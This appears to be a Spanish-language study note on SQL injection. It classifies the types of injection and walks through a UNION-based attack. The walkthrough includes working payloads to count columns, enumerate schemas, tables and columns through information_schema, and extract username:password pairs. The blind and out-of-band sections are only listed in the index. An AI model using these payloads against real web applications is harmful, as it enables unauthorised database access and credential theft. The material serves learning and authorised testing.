## SQL Injection

### Indice
- [Tipos y funcionamiento general](#como)
- #### IN BAND
  *   [Union](#union)
  *   [Error](#error)
- #### BLIND
  *   [Boolean](#boolean)
  *   [Time](#tine)
- #### OUT OF BAND
  *   [Out of band](#out)

<a name="como"></a>
## Tipos y funcionamiento
Tenemos 3 tipos:
* IN BAND
  Es la que vemos la respuesta de la base de datos en la respuesta del servidor. Es la mas sencilla de todas. tendriamos de tipo UNION y ERROR.

* BLIND
  No veriamos la respuesta de la base de datos en ninguna respuesta del servidor, y tendriamos de tipo BOOLEAN y tipo TIME

* OUT OF BAND

## IN BAND

<a name="union"></a>
### Union
Hay que tener en cuenta que cuando realizamos la instruccion UNION entre dos SELECT, ambos select deben tener el mismo numero de columnas. asi que lo primero es determinar el numero de columnas de la query que esta corriendo en el servidor.  
se puede hacer con un order by, ejemplo:  

empezamos con un order by 1, luego con un order by 2, y asi hasta que de error. cuando de error por ejemplo en el order by 4, pues sabemos que hay 3 columnas. 
```
' ORDER BY 1
' ORDER BY 2
' ORDER BY 3
' ...
```
Una vez determinado la cantidad de columnas de la query, vamos a investigar en la base de datos:  

suponiendo que tiene 3 columnas, ejecutamos la siguiente sentencia:  
```
'UNION SELECT schema_name, null,null FROM information_schema.schemata-- -
```
suponemos que encontramos las siguentes bases de datos:
* information_schema
* perfomance_schema
* mysql
* webserver

ahora vamos a indagar en webserver:  
```
'UNION SELECT table_name,null,null FROM information_schema.tables WHERE table_schema="webserver"-- -
```
suponemos que encontramos las siguientes tablas:  

* users
* books
* images
vamos a indagar en users:
```
'UNION SELECT column_name,null,null FROM information_schema.columns WHERE table_name="users" and table_schema="webserver"-- -
```

y vemos que tiene las columnas:
* id
* user
* password
ahora para extraer esos datos es tan sencillo como:
```
'UNION SELECT CONCAT(user,0x3a,password),null,null FROM users WHERE table_schema="webserver"-- - 
```
APUNTES:  

- el concat no es siempre necesario
- 0x3a en hexadecimal significa los dos puntos ":"
- el where no deberia ser necesario en caso de usuarios y claves xq ya la web está preparada para consultar en esa base de datos
